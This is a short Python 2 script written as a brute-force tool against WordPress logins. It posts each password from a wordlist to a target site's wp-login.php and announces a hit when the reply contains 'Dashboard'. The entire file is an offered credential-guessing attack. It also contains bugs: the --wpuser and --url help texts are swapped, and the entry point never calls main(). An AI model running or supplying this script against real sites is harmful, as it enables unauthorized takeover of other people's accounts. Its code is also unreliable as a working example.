import sys
import requests

def make_login(user, password, wp_url):
        post_requests = {"log":user , "pwd":password}
        r = requests.post("http://" + wp_url + "wp-login.php", data=post_requests)
        output = r.text

        if output.find("Dashboard") > 0:
                return True
        else:
                return False

def main(options):
        wp_user = options.wp_user
        wp_url = options.wp_url
        pass_file_path = options.pass_file_path

        f = open(pass_file_path)
        passwords = f.read().splitlines()
        f.close()

        for password in passwords:
                print "."
                if make_login(wp_user, password, wp_url):
                        print "Ohhh Yeaaaah! the password is: " + password

if __name__ == "__main__":
        from optparse import OptionParser

        usage = "Usage: %prog <params>"
        parser = OptionParser(usage=usage)
        parser.add_option("--wpuser", dest="wp_user",
        help="The url to connect to")
        parser.add_option("--url", dest="wp_url",
        help="The username used to brutforce")
        parser.add_option("--pass-file", dest="pass_file_path",
        help="File with a list of passwords",
        default="rainbow.txt")

        (options, args) = parser.parse_args()
        if options.wp_user is None:
                print("Error: You must specify a user name")
                parser.print_help()
                sys.exit(1)

        if options.wp_url is None:
                print("Error: You must specify a url")
                parser.print_help()
                sys.exit(1)
